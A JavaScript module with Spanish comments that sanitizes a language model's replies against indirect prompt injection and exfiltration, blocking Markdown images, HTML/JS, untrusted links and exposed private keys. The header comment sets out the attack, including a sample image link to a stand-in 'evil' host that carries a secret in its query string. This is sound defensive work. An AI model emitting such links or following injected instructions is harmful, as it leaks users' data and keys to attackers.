/**
 * Saneado de la salida del modelo (defensa contra prompt injection indirecta y exfiltración).
 *
 * Un documento o un mensaje malicioso puede conseguir que el modelo escriba:
 *   - imágenes Markdown `![x](https://evil/?d=SECRETO)` → el navegador las pide solas y filtra datos,
 *   - enlaces de phishing con texto engañoso `[Entra en bezhas.com](https://evil)`,
 *   - HTML/JS (`<script>`, `<iframe>`, `javascript:`),
 *   - claves privadas o frases semilla.
 * El texto resultante solo conserva enlaces a rutas internas del catálogo y a dominios propios.
 */
const { isSafePath } = require('./actions');

const TRUSTED_HOSTS = () =>
    (process.env.AI_TRUSTED_LINK_HOSTS || 'bezhas.com,www.bezhas.com').split(',').map((h) => h.trim().toLowerCase()).filter(Boolean);

const BLOCKED_LINK = '[enlace bloqueado]';
const BLOCKED_IMAGE = '[imagen bloqueada]';

function trustedUrl(raw) {
    let u;
    try { u = new URL(raw); } catch (_) { return false; }
    if (u.protocol !== 'https:' || u.username || u.password || u.port) return false;
    return TRUSTED_HOSTS().includes(u.hostname.toLowerCase());
}

const allowedTarget = (target) => {
    const t = String(target || '').trim().replace(/^<|>$/g, '');
    return isSafePath(t) || trustedUrl(t);
};

/** ¿Es un carácter de control (salvo \n y \t) o una marca bidireccional que disfraza texto? Por código de carácter, sin literales bidi. */
const isHiddenChar = (cp) => cp <= 0x08 || cp === 0x0b || cp === 0x0c || (cp >= 0x0e && cp <= 0x1f) || cp === 0x7f
    || (cp >= 0x202a && cp <= 0x202e) || (cp >= 0x2066 && cp <= 0x2069);

function stripHiddenChars(text) {
    let out = '';
    for (const ch of String(text)) if (!isHiddenChar(ch.codePointAt(0))) out += ch;
    return out;
}

/**
 * Recorre `[texto](destino "título")` en tiempo lineal (sin expresión regular con repeticiones anidadas) y
 * llama a `replace(label, target)` por cada enlace bien formado. Límites: texto 300, destino 2000, título 200.
 */
function mapMarkdownLinks(text, replace) {
    let out = '';
    let i = 0;
    while (i < text.length) {
        if (text[i] !== '[') { out += text[i++]; continue; }
        const close = text.indexOf(']', i + 1);
        if (close === -1 || close - i - 1 > 300 || text.slice(i + 1, close).includes('[') || text[close + 1] !== '(') { out += text[i++]; continue; }
        let j = close + 2;
        while (j < text.length && /\s/.test(text[j])) j++;
        const tStart = j;
        while (j < text.length && j - tStart <= 2000 && text[j] !== ')' && !/\s/.test(text[j])) j++;
        const target = text.slice(tStart, j);
        if (j - tStart > 2000) { out += text[i++]; continue; }
        // Título opcional: espacios + "..." (hasta 200 caracteres sin comillas).
        let k = j;
        while (k < text.length && /\s/.test(text[k])) k++;
        if (k > j && text[k] === '"') {
            const endQuote = text.indexOf('"', k + 1);
            if (endQuote !== -1 && endQuote - k - 1 <= 200) { k = endQuote + 1; while (k < text.length && /\s/.test(text[k])) k++; }
        }
        if (text[k] !== ')') { out += text[i++]; continue; }
        out += replace(text.slice(i + 1, close), target);
        i = k + 1;
    }
    return out;
}

function sanitizeModelOutput(input) {
    if (typeof input !== 'string' || !input) return '';
    let text = input;

    // Caracteres de control (salvo \n \t) y marcas bidireccionales que disfrazan texto.
    text = stripHiddenChars(text);

    // Imágenes Markdown: siempre fuera (canal de exfiltración sin interacción).
    text = text.replace(/!\[[^\]]{0,300}\]\([^)]{0,2000}\)/g, BLOCKED_IMAGE);
    text = text.replace(/!\[[^\]]{0,300}\]\[[^\]]{0,100}\]/g, BLOCKED_IMAGE);

    // HTML: bloques peligrosos completos y cualquier otra etiqueta.
    text = text.replace(/<\s*(script|style|iframe|object|embed|svg|math|form)\b[\s\S]{0,20000}?<\s*\/\s*\1\s*>/gi, '');
    text = text.replace(/<\/?\s*[a-zA-Z][^>]{0,500}>/g, (tag) => (/^<https?:\/\/[^\s>]+>$/i.test(tag) ? tag : ''));

    // Enlaces Markdown [texto](destino "título"): se conserva solo si el destino es de confianza.
    text = mapMarkdownLinks(text, (label, target) =>
        (allowedTarget(target) ? `[${label}](${target.replace(/^<|>$/g, '')})` : `${label} ${BLOCKED_LINK}`));

    // Definiciones de referencia `[id]: destino`.
    text = text.replace(/^\s{0,3}\[[^\]]{1,100}\]:\s*(\S+).*$/gm, (line, target) => (allowedTarget(target) ? line : BLOCKED_LINK));

    // Autoenlaces <https://...> y URLs sueltas con esquema.
    text = text.replace(/<(https?:\/\/[^\s>]+)>/gi, (m, url) => (trustedUrl(url) ? m : BLOCKED_LINK));
    text = text.replace(/\b(?:https?|ftp|file|data|javascript|vbscript):[^\s)>\]]*/gi, (url) => (trustedUrl(url) ? url : BLOCKED_LINK));

    // Claves privadas (64 hex con o sin 0x) y frases semilla (12/24 palabras BIP-39 típicas no se detectan por
    // diccionario aquí; se cubre el formato de clave que el modelo nunca debe reproducir).
    text = text.replace(/\b(?:0x)?[a-fA-F0-9]{64}\b/g, '[dato sensible oculto]');

    return text;
}

module.exports = { sanitizeModelOutput, stripHiddenChars, trustedUrl, BLOCKED_LINK, BLOCKED_IMAGE };
